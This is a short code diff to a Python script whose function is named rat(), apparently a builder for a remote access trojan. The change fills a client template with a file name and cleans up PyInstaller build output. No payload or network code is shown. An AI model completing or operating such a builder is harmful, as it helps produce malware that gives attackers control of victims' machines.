@@ -44,7 +44,13 @@ def rat():
     
     os.remove(f"{delete_file}.spec")
     shutil.rmtree('build')
-    
+    fin = open("base", "rt")
+    fout = open("client.py", "wt")
+    for line in fin:
+      fout.write(line.replace('NOMFICHIER', delete_file))
+    fin.close()
+    fout.close()
+    os.remove('client.py')
     os.remove(f'{name}')
     console.input("{[green]![/green]}you can now check in the [blue]dist folder[/blue]")
     
@@ -70,4 +76,4 @@ while True:
     console = get_console()
     console.print(banner, style="green")
 
-    rat() 
+    rat()
